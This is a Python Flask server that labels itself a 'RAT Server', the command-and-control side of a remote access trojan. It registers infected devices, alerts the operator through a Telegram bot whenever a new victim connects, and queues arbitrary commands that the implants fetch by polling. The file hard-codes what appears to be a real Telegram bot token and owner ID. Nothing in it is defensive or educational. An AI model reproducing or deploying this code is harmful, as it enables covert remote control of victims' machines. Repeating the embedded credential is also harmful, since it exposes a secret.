from flask import Flask, request, jsonify
import requests
import os

app = Flask(__name__)

# ==== CONFIG ====
BOT_TOKEN = '7814616506:AAHixHaptUH9hPcLq3awDS3mqHGScs3y9Yc'
OWNER_ID = '7554840326'
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

# ==== DEVICE STORAGE ====
connected_devices = {}  # device_id -> {'name': ..., 'chat_id': ...}
last_commands = {}      # device_id -> 'last_command'

# ==== ROUTES ====

@app.route('/')
def home():
    return jsonify({"status": "ok", "message": "RAT Server Running"})

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    device_id = data.get("device_id")
    name = data.get("device_name")
    chat_id = data.get("chat_id")

    if not all([device_id, name, chat_id]):
        return jsonify({"error": "Missing fields"}), 400

    connected_devices[device_id] = {
        "name": name,
        "chat_id": chat_id
    }

    # Notify owner
    msg = f"✅ New device connected:\n• Name: {name}\n• ID: {device_id}"
    requests.post(TELEGRAM_API, json={"chat_id": OWNER_ID, "text": msg})
    return jsonify({"status": "registered"})

@app.route('/devices', methods=['GET'])
def get_devices():
    return jsonify({
        "devices": [
            {"id": device_id, "name": info["name"]}
            for device_id, info in connected_devices.items()
        ]
    })

@app.route('/send/<device_id>', methods=['POST'])
def send_command(device_id):
    cmd = request.json.get("command")

    if device_id not in connected_devices:
        return jsonify({"error": "Device not found"}), 404

    last_commands[device_id] = cmd  # Save last command
    return jsonify({"status": "command stored"})

@app.route('/get_command/<device_id>', methods=['GET'])
def get_command(device_id):
    cmd = last_commands.get(device_id, "")
    return jsonify({"command": cmd})

# ==== RUN ====
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
